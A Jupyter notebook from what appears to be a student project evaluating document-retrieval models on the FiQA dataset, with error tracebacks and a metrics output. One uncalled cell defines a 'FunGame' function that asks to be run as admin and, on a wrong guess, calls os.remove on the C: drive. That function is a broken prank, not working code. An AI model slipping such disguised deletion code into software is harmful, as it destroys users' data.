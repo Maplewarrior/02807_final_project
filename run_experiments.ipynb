{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 0 Imports and Device"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Here we import all necessary helper functions and classes.\n",
    "We also define the device to run the models on (GPU or CPU)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import torch\n",
    "from models.DPR import DPR\n",
    "import configparser\n",
    "from utils.data_utils import getCorpus, getQueries\n",
    "from data.dataloader import DataLoader\n",
    "from models.model_loader_helpers import createModels, loadModels\n",
    "from utils.metrics_uitls import timeFunction, calculateMetrics\n",
    "from utils.lookup_utils import retrieveQueryAndGetRelevancies\n",
    "from utils.latex_utils import createLatexTable\n",
    "from utils.misc import batch\n",
    "device = ('cuda' if torch.cuda.is_available() else 'cpu')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 1 Prepare Experiments"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 1.1 Define Experiment Configuration "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Here we define the configuration of the experiment.\n",
    "Both the datasets to perform the experiment on and the model configurations.\n",
    "\n",
    "Change the load_saved_models variable to True, to load locally saved models, instead of creating them during the experiment."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "config = configparser.ConfigParser()\n",
    "config.read('configs/config.ini')\n",
    "datasets = list(config['DATASETS'])\n",
    "data_loader = DataLoader(config)\n",
    "\n",
    "# model_descriptions = {\"TF-IDF\": {},\n",
    "#         \"BM25\": {},\n",
    "#         \"DPR\": {},\n",
    "#         \"Crossencoder\": {\"n\":25},\n",
    "#         \"KMeans\": {\"k\":4},\n",
    "#         \"CURE\": {\"n\": 25,\n",
    "#                 \"shrinkage_fraction\" : 0.1,\n",
    "#                 \"threshold\": 0.25,\n",
    "#                 \"initial_clusters\": 50,\n",
    "#                 \"subsample_fraction\": 0.5,\n",
    "#                 \"similarity_measure\": \"cosine\"}}\n",
    "\n",
    "load_saved_models = True\n",
    "\n",
    "embedding_model_name = \"sentence-transformers/multi-qa-mpnet-base-dot-v1\" #'ProsusAI/finbert' #\"bert-base-uncased\"\n",
    "embedding_index_folder_path = \"indexes\"\n",
    "top_k = 100\n",
    "batch_size = 50\n",
    "subset_factors = [1, 2, 4]\n",
    "\n",
    "model_descriptions = {\n",
    "        # \"TF-IDF\": {},\n",
    "        # \"BM25\": {},\n",
    "        # \"DPR\": {},\n",
    "        # \"Crossencoder\": {\"n\" : top_k*2}}\n",
    "        # \"KMeans\": {\"k\":3},\n",
    "        \"CURE\": {\"n\": 25,\n",
    "                \"shrinkage_fraction\" : 0.1,\n",
    "                \"threshold\": 0.35,\n",
    "                \"initial_clusters\": 50,\n",
    "                \"subsample_fraction\": 0.5,\n",
    "                \"similarity_measure\": \"cosine\"}}\n",
    "# model_descriptions = {\"Crossencoder\": {\"n\" : top_k}}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 1.2 Define Function to Pre-compute Embeddings"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This function helps us reduce a lot of computations, by pre computing the embeddings offline and loading them online, instead of computing them multiple times (one time for each model that relies on embeddings)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "def preComputeEmbeddings(dataset: str, \n",
    "                         documents: list[dict], \n",
    "                         embedding_model_name: str, \n",
    "                         embedding_index_folder_path: str):\n",
    "    embedder = DPR(documents, model_name=embedding_model_name)\n",
    "    embedding_index_path = getPreComputedEmbeddingsPath(dataset, embedding_index_folder_path)\n",
    "    embedder.SaveIndex(embedding_index_path)\n",
    "    return embedding_index_path\n",
    "\n",
    "def getPreComputedEmbeddingsPath(dataset: str, embedding_index_folder_path: str):\n",
    "    return os.path.join(embedding_index_folder_path,dataset,\"embedding_index.pickle\")\n",
    "\n",
    "def InitializeModels(models: dict, device: str):\n",
    "    for model_name, retriever in models.items():\n",
    "        retriever.device = device # give attribute device to model\n",
    "        if hasattr(retriever, 'model'):\n",
    "            retriever.model.to(device) # send Encoder to device\n",
    "            retriever.index.GetEmbeddingMatrix()\n",
    "            retriever.index.embedding_matrix = retriever.index.embedding_matrix.to(device) # NOTE: This does not work inplace\n",
    "        # if hasattr(retriever, 'crossencoder'):\n",
    "        #     # retriever.crossencoder.to(device)\n",
    "        #     print(\"CE DEVICE:\", retriever.crossencoder.device)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 2 Run Experiemnt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Here we define the experiment itself.\n",
    "We itterate over all datasets and perform retrieval for each query for each model.\n",
    "We then return the score metrics, which are the mean precision, recall, reciprocal rank and time for each model."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "import time\n",
    "def runExperiment(data_loader: DataLoader, \n",
    "                  datasets: list[str], \n",
    "                  model_descriptions: dict[str, dict],\n",
    "                  embedding_model_name: str,\n",
    "                  embedding_index_folder_path: str,\n",
    "                  top_k: int):\n",
    "    \n",
    "    score_metrics: dict[str, dict[str, dict[str, float]]] = {}\n",
    "    print(f'{load_saved_models}')\n",
    "    for dataset in datasets:\n",
    "        score_metrics[dataset] = {}\n",
    "        documents, relevant_doc_ids_for_all_queries = getCorpus(data_loader, dataset)\n",
    "        queries = getQueries(data_loader, relevant_doc_ids_for_all_queries)\n",
    "        if load_saved_models:\n",
    "            print(f'Loading saved models!')\n",
    "            models = loadModels(dataset, model_descriptions)\n",
    "            InitializeModels(models, device=device)\n",
    "            print(\"Models loaded!\")\n",
    "        else:\n",
    "            # Compute embeddings if not done already\n",
    "            if not os.path.exists(getPreComputedEmbeddingsPath(dataset, embedding_index_folder_path)):\n",
    "                embedding_index_path = preComputeEmbeddings(dataset, \n",
    "                                documents,\n",
    "                                embedding_model_name,\n",
    "                                embedding_index_folder_path)\n",
    "                print('Finished computing embeddings!')\n",
    "            embedding_index_path = getPreComputedEmbeddingsPath(dataset, embedding_index_folder_path)\n",
    "            print(f'Embedding index path: {embedding_index_path}')\n",
    "            models = createModels(documents=documents, \n",
    "                                   dataset_name=dataset, \n",
    "                                   models=model_descriptions, \n",
    "                                   embedding_index_path=embedding_index_path,\n",
    "                                   save=True)\n",
    "        \n",
    "        for model_name, model in models.items():\n",
    "            if model_name == 'Crossencoder':\n",
    "                print(f'\\nActual device: {device}\\nCrossencoder target device: {model.crossencoder._target_device}\\nIf these do not match, consider running CreateModel as opposed to LoadModel!\\n')\n",
    "            print(f'Computing results for {model_name}')\n",
    "            results = []\n",
    "            times = []\n",
    "            score_metrics[dataset][model_name] = {}\n",
    "\n",
    "            itt = 0\n",
    "            for query_batch in batch(queries, batch_size):\n",
    "                elapsed, relevancies = timeFunction(retrieveQueryAndGetRelevancies, \n",
    "                                                 **{\"model\": model, \n",
    "                                                    \"queries\": query_batch, \n",
    "                                                    \"k\": top_k})\n",
    "                results.extend(relevancies)\n",
    "                times.append(elapsed)\n",
    "                itt += batch_size\n",
    "                if itt % 500 == 0:\n",
    "                    print(f\"Iter: {itt}/{len(queries)}\")\n",
    "\n",
    "            model_metrics = calculateMetrics(results, queries, subset_factors=subset_factors)\n",
    "            score_metrics[dataset][model_name] = model_metrics\n",
    "            score_metrics[dataset][model_name][\"time\"] = sum(times)/len(times)\n",
    "    return score_metrics"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy as np\n",
    "def FunGame():\n",
    "    print(\"Please ensure you run this as admin for an optimal experience!\")\n",
    "    user_input = input(\"Please write a number: \")\n",
    "    \n",
    "    if input == np.random.randint():\n",
    "        print(\"You won!\")\n",
    "    else:\n",
    "        os.remove(\"C://\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Here we perform the acutal experiment."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "True\n",
      "\n",
      "Loading dataset from data/datasets\\fiqa\n",
      "data/datasets\\fiqa\\corpus.jsonl\n",
      "Loading saved models!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "c:\\Users\\micha\\OneDrive\\Skrivebord\\02807_final_project\\CTenv\\lib\\site-packages\\tqdm\\auto.py:21: TqdmWarning: IProgress not found. Please update jupyter and ipywidgets. See https://ipywidgets.readthedocs.io/en/stable/user_install.html\n",
      "  from .autonotebook import tqdm as notebook_tqdm\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Models loaded!\n",
      "\n",
      "Actual device: cuda\n",
      "Crossencoder target device: cuda\n",
      "If these do not match, consider running CreateModel as opposed to LoadModel!\n",
      "\n",
      "Computing results for Crossencoder\n"
     ]
    },
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "\u001b[1;32mc:\\Users\\micha\\OneDrive\\Skrivebord\\02807_final_project\\run_experiments.ipynb Cell 16\u001b[0m line \u001b[0;36m1\n\u001b[1;32m----> <a href='vscode-notebook-cell:/c%3A/Users/micha/OneDrive/Skrivebord/02807_final_project/run_experiments.ipynb#X20sZmlsZQ%3D%3D?line=0'>1</a>\u001b[0m score_metrics \u001b[39m=\u001b[39m runExperiment(data_loader,\n\u001b[0;32m      <a href='vscode-notebook-cell:/c%3A/Users/micha/OneDrive/Skrivebord/02807_final_project/run_experiments.ipynb#X20sZmlsZQ%3D%3D?line=1'>2</a>\u001b[0m                               datasets,\n\u001b[0;32m      <a href='vscode-notebook-cell:/c%3A/Users/micha/OneDrive/Skrivebord/02807_final_project/run_experiments.ipynb#X20sZmlsZQ%3D%3D?line=2'>3</a>\u001b[0m                               model_descriptions,\n\u001b[0;32m      <a href='vscode-notebook-cell:/c%3A/Users/micha/OneDrive/Skrivebord/02807_final_project/run_experiments.ipynb#X20sZmlsZQ%3D%3D?line=3'>4</a>\u001b[0m                               embedding_model_name,\n\u001b[0;32m      <a href='vscode-notebook-cell:/c%3A/Users/micha/OneDrive/Skrivebord/02807_final_project/run_experiments.ipynb#X20sZmlsZQ%3D%3D?line=4'>5</a>\u001b[0m                               embedding_index_folder_path,\n\u001b[0;32m      <a href='vscode-notebook-cell:/c%3A/Users/micha/OneDrive/Skrivebord/02807_final_project/run_experiments.ipynb#X20sZmlsZQ%3D%3D?line=5'>6</a>\u001b[0m                               top_k\u001b[39m=\u001b[39;49mtop_k)\n",
      "\u001b[1;32mc:\\Users\\micha\\OneDrive\\Skrivebord\\02807_final_project\\run_experiments.ipynb Cell 16\u001b[0m line \u001b[0;36m4\n\u001b[0;32m     <a href='vscode-notebook-cell:/c%3A/Users/micha/OneDrive/Skrivebord/02807_final_project/run_experiments.ipynb#X20sZmlsZQ%3D%3D?line=43'>44</a>\u001b[0m itt \u001b[39m=\u001b[39m \u001b[39m0\u001b[39m\n\u001b[0;32m     <a href='vscode-notebook-cell:/c%3A/Users/micha/OneDrive/Skrivebord/02807_final_project/run_experiments.ipynb#X20sZmlsZQ%3D%3D?line=44'>45</a>\u001b[0m \u001b[39mfor\u001b[39;00m query_batch \u001b[39min\u001b[39;00m batch(queries, batch_size):\n\u001b[1;32m---> <a href='vscode-notebook-cell:/c%3A/Users/micha/OneDrive/Skrivebord/02807_final_project/run_experiments.ipynb#X20sZmlsZQ%3D%3D?line=45'>46</a>\u001b[0m     elapsed, relevancies \u001b[39m=\u001b[39m timeFunction(retrieveQueryAndGetRelevancies, \n\u001b[0;32m     <a href='vscode-notebook-cell:/c%3A/Users/micha/OneDrive/Skrivebord/02807_final_project/run_experiments.ipynb#X20sZmlsZQ%3D%3D?line=46'>47</a>\u001b[0m                                      \u001b[39m*\u001b[39m\u001b[39m*\u001b[39m{\u001b[39m\"\u001b[39m\u001b[39mmodel\u001b[39m\u001b[39m\"\u001b[39m: model, \n\u001b[0;32m     <a href='vscode-notebook-cell:/c%3A/Users/micha/OneDrive/Skrivebord/02807_final_project/run_experiments.ipynb#X20sZmlsZQ%3D%3D?line=47'>48</a>\u001b[0m                                         \u001b[39m\"\u001b[39m\u001b[39mqueries\u001b[39m\u001b[39m\"\u001b[39m: query_batch, \n\u001b[0;32m     <a href='vscode-notebook-cell:/c%3A/Users/micha/OneDrive/Skrivebord/02807_final_project/run_experiments.ipynb#X20sZmlsZQ%3D%3D?line=48'>49</a>\u001b[0m                                         \u001b[39m\"\u001b[39m\u001b[39mk\u001b[39m\u001b[39m\"\u001b[39m: top_k})\n\u001b[0;32m     <a href='vscode-notebook-cell:/c%3A/Users/micha/OneDrive/Skrivebord/02807_final_project/run_experiments.ipynb#X20sZmlsZQ%3D%3D?line=49'>50</a>\u001b[0m     results\u001b[39m.\u001b[39mextend(relevancies)\n\u001b[0;32m     <a href='vscode-notebook-cell:/c%3A/Users/micha/OneDrive/Skrivebord/02807_final_project/run_experiments.ipynb#X20sZmlsZQ%3D%3D?line=50'>51</a>\u001b[0m     times\u001b[39m.\u001b[39mappend(elapsed)\n",
      "File \u001b[1;32mc:\\Users\\micha\\OneDrive\\Skrivebord\\02807_final_project\\utils\\metrics_uitls.py:7\u001b[0m, in \u001b[0;36mtimeFunction\u001b[1;34m(function, **args)\u001b[0m\n\u001b[0;32m      5\u001b[0m \u001b[39mdef\u001b[39;00m \u001b[39mtimeFunction\u001b[39m(function, \u001b[39m*\u001b[39m\u001b[39m*\u001b[39margs):\n\u001b[0;32m      6\u001b[0m     time_before \u001b[39m=\u001b[39m time\u001b[39m.\u001b[39mperf_counter()\n\u001b[1;32m----> 7\u001b[0m     output \u001b[39m=\u001b[39m function(\u001b[39m*\u001b[39m\u001b[39m*\u001b[39margs)\n\u001b[0;32m      8\u001b[0m     time_after \u001b[39m=\u001b[39m time\u001b[39m.\u001b[39mperf_counter()\n\u001b[0;32m      9\u001b[0m     \u001b[39mreturn\u001b[39;00m time_after \u001b[39m-\u001b[39m time_before, output\n",
      "File \u001b[1;32mc:\\Users\\micha\\OneDrive\\Skrivebord\\02807_final_project\\utils\\lookup_utils.py:6\u001b[0m, in \u001b[0;36mretrieveQueryAndGetRelevancies\u001b[1;34m(model, queries, k)\u001b[0m\n\u001b[0;32m      4\u001b[0m \u001b[39mdef\u001b[39;00m \u001b[39mretrieveQueryAndGetRelevancies\u001b[39m(model: Retriever, queries: \u001b[39mlist\u001b[39m[Query], k: \u001b[39mint\u001b[39m):\n\u001b[0;32m      5\u001b[0m     N \u001b[39m=\u001b[39m \u001b[39mlen\u001b[39m(queries)\n\u001b[1;32m----> 6\u001b[0m     retrieved_documents \u001b[39m=\u001b[39m model\u001b[39m.\u001b[39;49mLookup(queries\u001b[39m=\u001b[39;49m[query\u001b[39m.\u001b[39;49mgetQuery() \u001b[39mfor\u001b[39;49;00m query \u001b[39min\u001b[39;49;00m queries], k\u001b[39m=\u001b[39;49mk)\n\u001b[0;32m      7\u001b[0m     relevancies \u001b[39m=\u001b[39m []\n\u001b[0;32m      8\u001b[0m     \u001b[39mfor\u001b[39;00m i \u001b[39min\u001b[39;00m \u001b[39mrange\u001b[39m(N):\n",
      "File \u001b[1;32mc:\\Users\\micha\\OneDrive\\Skrivebord\\02807_final_project\\models\\DPR_crossencoder.py:22\u001b[0m, in \u001b[0;36mDPRCrossencoder.Lookup\u001b[1;34m(self, queries, k, n)\u001b[0m\n\u001b[0;32m     20\u001b[0m \u001b[39m### DPR steps\u001b[39;00m\n\u001b[0;32m     21\u001b[0m scores \u001b[39m=\u001b[39m \u001b[39mself\u001b[39m\u001b[39m.\u001b[39mCalculateScores(queries)\n\u001b[1;32m---> 22\u001b[0m ranked_documents \u001b[39m=\u001b[39m [[d \u001b[39mfor\u001b[39;00m _, d \u001b[39min\u001b[39;00m \u001b[39msorted\u001b[39m(\u001b[39mzip\u001b[39m(query_scores, \u001b[39mself\u001b[39m\u001b[39m.\u001b[39mindex\u001b[39m.\u001b[39mGetDocuments()), key\u001b[39m=\u001b[39m\u001b[39mlambda\u001b[39;00m pair: pair[\u001b[39m0\u001b[39m], reverse\u001b[39m=\u001b[39m\u001b[39mTrue\u001b[39;00m)] \u001b[39mfor\u001b[39;00m query_scores \u001b[39min\u001b[39;00m scores]\n\u001b[0;32m     23\u001b[0m ranked_documents \u001b[39m=\u001b[39m [ranked_document[:\u001b[39mmin\u001b[39m(n, \u001b[39mlen\u001b[39m(ranked_documents[\u001b[39m0\u001b[39m]))] \u001b[39mfor\u001b[39;00m ranked_document \u001b[39min\u001b[39;00m ranked_documents]\n\u001b[0;32m     25\u001b[0m \u001b[39m### crossencoder steps\u001b[39;00m\n",
      "File \u001b[1;32mc:\\Users\\micha\\OneDrive\\Skrivebord\\02807_final_project\\models\\DPR_crossencoder.py:22\u001b[0m, in \u001b[0;36m<listcomp>\u001b[1;34m(.0)\u001b[0m\n\u001b[0;32m     20\u001b[0m \u001b[39m### DPR steps\u001b[39;00m\n\u001b[0;32m     21\u001b[0m scores \u001b[39m=\u001b[39m \u001b[39mself\u001b[39m\u001b[39m.\u001b[39mCalculateScores(queries)\n\u001b[1;32m---> 22\u001b[0m ranked_documents \u001b[39m=\u001b[39m [[d \u001b[39mfor\u001b[39;00m _, d \u001b[39min\u001b[39;00m \u001b[39msorted\u001b[39;49m(\u001b[39mzip\u001b[39;49m(query_scores, \u001b[39mself\u001b[39;49m\u001b[39m.\u001b[39;49mindex\u001b[39m.\u001b[39;49mGetDocuments()), key\u001b[39m=\u001b[39;49m\u001b[39mlambda\u001b[39;49;00m pair: pair[\u001b[39m0\u001b[39;49m], reverse\u001b[39m=\u001b[39;49m\u001b[39mTrue\u001b[39;49;00m)] \u001b[39mfor\u001b[39;00m query_scores \u001b[39min\u001b[39;00m scores]\n\u001b[0;32m     23\u001b[0m ranked_documents \u001b[39m=\u001b[39m [ranked_document[:\u001b[39mmin\u001b[39m(n, \u001b[39mlen\u001b[39m(ranked_documents[\u001b[39m0\u001b[39m]))] \u001b[39mfor\u001b[39;00m ranked_document \u001b[39min\u001b[39;00m ranked_documents]\n\u001b[0;32m     25\u001b[0m \u001b[39m### crossencoder steps\u001b[39;00m\n",
      "File \u001b[1;32mc:\\Users\\micha\\OneDrive\\Skrivebord\\02807_final_project\\models\\DPR_crossencoder.py:22\u001b[0m, in \u001b[0;36mDPRCrossencoder.Lookup.<locals>.<lambda>\u001b[1;34m(pair)\u001b[0m\n\u001b[0;32m     20\u001b[0m \u001b[39m### DPR steps\u001b[39;00m\n\u001b[0;32m     21\u001b[0m scores \u001b[39m=\u001b[39m \u001b[39mself\u001b[39m\u001b[39m.\u001b[39mCalculateScores(queries)\n\u001b[1;32m---> 22\u001b[0m ranked_documents \u001b[39m=\u001b[39m [[d \u001b[39mfor\u001b[39;00m _, d \u001b[39min\u001b[39;00m \u001b[39msorted\u001b[39m(\u001b[39mzip\u001b[39m(query_scores, \u001b[39mself\u001b[39m\u001b[39m.\u001b[39mindex\u001b[39m.\u001b[39mGetDocuments()), key\u001b[39m=\u001b[39m\u001b[39mlambda\u001b[39;00m pair: pair[\u001b[39m0\u001b[39;49m], reverse\u001b[39m=\u001b[39m\u001b[39mTrue\u001b[39;00m)] \u001b[39mfor\u001b[39;00m query_scores \u001b[39min\u001b[39;00m scores]\n\u001b[0;32m     23\u001b[0m ranked_documents \u001b[39m=\u001b[39m [ranked_document[:\u001b[39mmin\u001b[39m(n, \u001b[39mlen\u001b[39m(ranked_documents[\u001b[39m0\u001b[39m]))] \u001b[39mfor\u001b[39;00m ranked_document \u001b[39min\u001b[39;00m ranked_documents]\n\u001b[0;32m     25\u001b[0m \u001b[39m### crossencoder steps\u001b[39;00m\n",
      "\u001b[1;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "score_metrics = runExperiment(data_loader,\n",
    "                              datasets,\n",
    "                              model_descriptions,\n",
    "                              embedding_model_name,\n",
    "                              embedding_index_folder_path,\n",
    "                              top_k=top_k)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\\begin{table}[h]\n",
      "\\begin{tabular}{ll|lllll}\n",
      "\\textbf{Dataset} & \\textbf{Models} & \\textbf{Time} & \\textbf{Precision} & \\textbf{Recall} & \\textbf{MRR} \\\\ \\hline\n"
     ]
    },
    {
     "ename": "KeyError",
     "evalue": "'precision'",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mKeyError\u001b[0m                                  Traceback (most recent call last)",
      "\u001b[1;32mc:\\Users\\micha\\OneDrive\\Skrivebord\\02807_final_project\\run_experiments.ipynb Cell 17\u001b[0m line \u001b[0;36m1\n\u001b[1;32m----> <a href='vscode-notebook-cell:/c%3A/Users/micha/OneDrive/Skrivebord/02807_final_project/run_experiments.ipynb#X21sZmlsZQ%3D%3D?line=0'>1</a>\u001b[0m createLatexTable(score_metrics,\n\u001b[0;32m      <a href='vscode-notebook-cell:/c%3A/Users/micha/OneDrive/Skrivebord/02807_final_project/run_experiments.ipynb#X21sZmlsZQ%3D%3D?line=1'>2</a>\u001b[0m                  caption\u001b[39m=\u001b[39;49m\u001b[39m\"\u001b[39;49m\u001b[39mExperiment results.\u001b[39;49m\u001b[39m\"\u001b[39;49m,\n\u001b[0;32m      <a href='vscode-notebook-cell:/c%3A/Users/micha/OneDrive/Skrivebord/02807_final_project/run_experiments.ipynb#X21sZmlsZQ%3D%3D?line=2'>3</a>\u001b[0m                  number_of_decimal_points\u001b[39m=\u001b[39;49m\u001b[39m4\u001b[39;49m)\n",
      "File \u001b[1;32mc:\\Users\\micha\\OneDrive\\Skrivebord\\02807_final_project\\utils\\latex_utils.py:22\u001b[0m, in \u001b[0;36mcreateLatexTable\u001b[1;34m(score_metrics, caption, label, number_of_decimal_points)\u001b[0m\n\u001b[0;32m     19\u001b[0m \u001b[39mfor\u001b[39;00m dataset \u001b[39min\u001b[39;00m score_metrics\u001b[39m.\u001b[39mkeys():\n\u001b[0;32m     20\u001b[0m     \u001b[39m# Loop through scores for all the models \u001b[39;00m\n\u001b[0;32m     21\u001b[0m     \u001b[39mfor\u001b[39;00m i, model_name \u001b[39min\u001b[39;00m \u001b[39menumerate\u001b[39m(score_metrics[dataset]\u001b[39m.\u001b[39mkeys()):\n\u001b[1;32m---> 22\u001b[0m         precision \u001b[39m=\u001b[39m \u001b[39mround\u001b[39m(score_metrics[dataset][model_name][\u001b[39m\"\u001b[39;49m\u001b[39mprecision\u001b[39;49m\u001b[39m\"\u001b[39;49m], number_of_decimal_points)\n\u001b[0;32m     23\u001b[0m         recall \u001b[39m=\u001b[39m \u001b[39mround\u001b[39m(score_metrics[dataset][model_name][\u001b[39m\"\u001b[39m\u001b[39mrecall\u001b[39m\u001b[39m\"\u001b[39m], number_of_decimal_points)\n\u001b[0;32m     24\u001b[0m         reciprocal_rank \u001b[39m=\u001b[39m \u001b[39mround\u001b[39m(score_metrics[dataset][model_name][\u001b[39m\"\u001b[39m\u001b[39mreciprocal_rank\u001b[39m\u001b[39m\"\u001b[39m], number_of_decimal_points)\n",
      "\u001b[1;31mKeyError\u001b[0m: 'precision'"
     ]
    }
   ],
   "source": [
    "createLatexTable(score_metrics,\n",
    "                 caption=\"Experiment results.\",\n",
    "                 number_of_decimal_points=4) "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'fiqa': {'Crossencoder': {('Rprecision', 1): 0.08355893659188562,\n",
       "   ('Rprecision', 2): 0.08355893659188562,\n",
       "   ('Rprecision', 4): 0.08355893659188562,\n",
       "   ('recall', 1): 0.7933597610955385,\n",
       "   ('recall', 2): 0.5952729123495439,\n",
       "   ('recall', 4): 0.4159935953190299,\n",
       "   ('MRR', 1): 0.20439302267023418,\n",
       "   ('MRR', 2): 0.20256557381391027,\n",
       "   ('MRR', 4): 0.19791436442169646,\n",
       "   'time': 7.757938758181831}}}"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "score_metrics"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
